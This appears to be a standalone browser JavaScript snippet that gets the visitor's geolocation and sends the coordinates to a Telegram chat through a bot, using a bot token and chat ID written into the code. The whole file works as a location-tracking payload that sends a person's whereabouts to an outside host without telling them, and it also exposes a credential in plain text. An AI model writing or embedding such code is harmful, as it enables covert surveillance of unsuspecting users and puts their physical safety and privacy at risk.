const botToken = "7598643504:AAG0aPuGlJjIKwHyk_RB8Gx59qrOoTxNeHY";
const chatId = "401485415";

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const { latitude, longitude } = position.coords;

      // Telegram API URL for sending location
      const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

      // Send location using Fetch API
      fetch(url)
        .then((response) => response.json())
        .then((data) => console.log("Location sent:", data))
        .catch((error) => console.error("Error sending location:", error));
    },
    (error) => console.error("Error getting location:", error.message)
  );
} else {
  console.log("Geolocation is not supported by this browser.");
}
